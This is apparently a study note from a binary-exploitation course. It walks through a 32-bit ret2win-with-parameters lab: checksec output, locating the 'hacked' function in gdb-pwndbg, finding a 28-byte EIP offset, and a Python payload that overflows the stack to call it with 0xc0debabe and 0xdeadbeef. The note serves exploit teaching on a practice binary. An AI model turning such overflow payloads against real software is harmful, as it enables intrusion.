[[Binary Exploitation/03-04 Ret2Win/04 Functions parameters/x86/Source Code|Source Code]]

#x86 #ret2win_params 

### Basic File Checks

1. File -> `./ret2win_params: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=57b54d38f04bf11e85baa1619dc95228d8fd14b1, for GNU/Linux 3.2.0, not stripped`
2. checksec ->
```python
[*] '/root/binary_exploitation/04/32/ret2win_params'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments
```

Now after looking at ghidra we can tell that the parameters it wants are `0xc0debabe` and `0xdeadbeef` 
So let's do manual exploitation

### Manual exploitation

Let's find the address of the hacked function using gdb-pwndbg

```python
gdb-pwndbg ./ret2win_params
info functions
```

Result:

```python
All defined functions:

Non-debugging symbols:
0x08049000  _init
0x08049030  printf@plt
0x08049040  puts@plt
0x08049050  __libc_start_main@plt
0x08049060  __isoc99_scanf@plt
0x08049070  _start
0x080490b0  _dl_relocate_static_pie
0x080490c0  __x86.get_pc_thunk.bx
0x080490d0  deregister_tm_clones
0x08049110  register_tm_clones
0x08049150  __do_global_dtors_aux
0x08049180  frame_dummy
0x08049182  hacked
0x080491d5  register_name
0x0804922b  main
0x08049247  __x86.get_pc_thunk.ax
0x08049250  __libc_csu_init
0x080492b0  __libc_csu_fini
0x080492b1  __x86.get_pc_thunk.bp
0x080492b8  _fini
```

The info functions shows all the functions and we can find the function that we want from there

The address of the hacked function is `0x08049182`

Let's find the offset using GDB-PWNDBG

```python
cylic 100
gb-pwndbg ./ret2win-params
```

Result:

```python
*EAX  0x6f
*EBX  0x61616166 ('faaa')
 ECX  0x0
*EDX  0xf7fc2540 ◂— 0xf7fc2540
*EDI  0xf7ffcb80 (_rtld_global_ro) ◂— 0x0
*ESI  0x8049250 (__libc_csu_init) ◂— push ebp
*EBP  0x61616167 ('gaaa')
*ESP  0xffffcf00 ◂— 'iaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa'
*EIP  0x61616168 ('haaa')
```

The offset to the EIP is 28 which can be found with `cyclic -l <EIP>`


Now let's do a little bit of python manual exploit


```python
print 28 * b'a' + '\x82\x91\x04\x08' + b'aaaa' + '\xbe\xba\xde\xc0' + '\xef\xbe\xad\xde'
```

So we are doing the offset to the EIP then the address of the hacked function then the padding for the other return pointer inside of the hacked function and then the actual parameters

###  Automated exploit

[[Binary Exploitation/03-04 Ret2Win/04 Functions parameters/x86/Python Script|Python Script]]